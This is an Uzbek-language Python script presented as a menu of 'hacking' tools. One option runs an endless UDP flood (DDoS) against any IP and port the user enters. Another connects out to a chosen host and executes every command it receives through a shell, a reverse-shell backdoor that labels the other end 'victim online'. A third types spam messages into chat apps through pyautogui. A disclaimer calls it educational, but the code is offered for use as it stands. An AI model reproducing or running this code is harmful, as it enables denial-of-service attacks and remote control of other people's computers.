#Tuzuvchi Asadbek Abdubannopov
#Yangilangan sana: 08/30/2023 10:41

def runddos():
    import socket,os,time,random 
    os.system('cls')
    
    
    print("Bu o'quv maqsadida holos. Har kim qilayotgan ishiga o'zi javob beradi.\nSiz qilayotgan ishingizga dasturchi aybdor emas!")
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    packet=random._urandom(21110)

    port=int(input("--[#]-- Istalgan portingizni kiriting:  "))

    ip=input("--[#]-- Nishon IP adressini kiritning:  ")

    sent=0

    while True:
       s.sendto(packet,(ip,port))
       sent+=1
       print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port,ip,sent))


def runping():
    print("Xatolik yuz berdi! Yoki kodlar mavjud emas!")

def run_sms():
    import pyautogui
    import time
    print("Cheksiz so'zlar yozib do'stlaringizni lol qoldiring!")
    print("Ishlamoqda.....")

    
    xabar = input("Xabar yozing\n>>")
    nechta = int(input("Necha marta takrorlansin>> "))
    print("Tayyorlaning 10 sekund(Telegram, yoki WHatsappga kirib oling. Do'stingizni akkauntini tanlang. Mana sizga cheksiz so'zlar)")
    print("Dasturni to'xtatish uchun (CTRL+C)")
    time.sleep(10)
    
    for i in range(nechta):
        pass
    while nechta > 0:
        nechta -=1
    
    pyautogui.typewrite(xabar.strip())
    pyautogui.press('enter')


def pc_attack():
    import socket
    import subprocess
    import os
    server = socket.socket()
    host = str(input("Kompyuterdi IP sini yozing:  "))   ## shu kopni ip adresssi
    if OSError:
        print("No internet connection!")
        os.system('exit')
    port = int(input("Portini kiriting:  "))
    server.connect((host, port))
    if socket.gaierror:
        print("No internet connection")
    run = True
    while run:

        xabar = server.recv(1024)
        result = subprocess.call(xabar.decode('UTF-8'),shell=True,universal_newlines=True)   ## command prompt windows terminal
        # result = subprocess.call(xabar.decode('UTF-8'), shell=True, universal_newlines=True)
        result = str(result)
        server.send('Qurbon online holatda ->>>'.encode('UTF-8'))



def menu():
    import datetime as dt
    import time
    import platform
    from art import tprint
    import socket,os,time,random 
    import pyautogui
    import subprocess
    print(r"""
___ ___ ___      _____     ___ ____ ___    ______      _____     _____       ____   ___
|   |   |   |   | ____|   |   |    |   |   |   _ \     |  |\ \   |  ____|    |    | /  /
|   |   |   |   | |____   |   |    |   |   |  | | \    |  | \ \  |  |        |    |/  /
|   |___|   |   |____  |  |   |____|   |   |  | |  \   |  | / /  |  _____    |    |  /
|   |___|   |        | |  |   |____|   |   |  | |  |   |  |/ /   |  _____|   |    |/ \
|   |   |   |        | |  |   |    |   |   |  |/  /    |  |\ \   |  |        |    |\  \
|   |   |   |	_____| |  |   |    |   |   |     /     |  | \ \  |  |_____   |    | \  \
____    ____   ________|   ___      ____   |____/      |__| /_/  _________|  |____|  \__\
 """)  
    x = platform.system()
    print(f"Systema turi {x}")


    x = dt.datetime.now()
    # print(x)
    vaqt = dt.datetime.now()
    yil = x.year
    kun = x.strftime("%A")

    print(f"Hozirgi yil {yil}")
    print(f"Hozirgi soat {vaqt}")

    print("\n****************************************************************")
    print("\n         [1] - DDOS hujum                                       *")
    print("\n         [2] - Internet tezligini o'lchash                      *")
    print("\n         [3] - Do'stlarni lol qoldirish                         *")
    print("\n         [4] - Boshqa kompyuterlarga ulanib boshqarish          *")
    print("\n****************************************************************")

    try:
        ask_menu = int(input("Menu: "))
        if ask_menu == 1:
            runddos()
        if ask_menu == 2:
            runping()
        if ask_menu == 3:
            run_sms()
        if ask_menu == 4:
            pc_attack()
        else:
            print("Bunday raqamdagi menu mavjud emas!")

    except ValueError:
        print("Siz butun son kiritishingiz kerak!")


def install_librarys():
    import os
    os.system('pip install art')
    os.system('pip install pyautogui')
    os.system('pip install subprocess')
    os.system('pip install pyspeedtest')
    os.system('pip install speedtest-cli')


def check_module():
    try:
        import datetime as dt
        import time
        import platform
        from art import tprint
        import socket,os,time,random 
        import pyautogui
        import subprocess
        import speedtest

        menu()

    except ImportError:
        install_librarys()
        print("Not installed Script packages..")
         
if __name__ == '__main__':
    check_module()
    
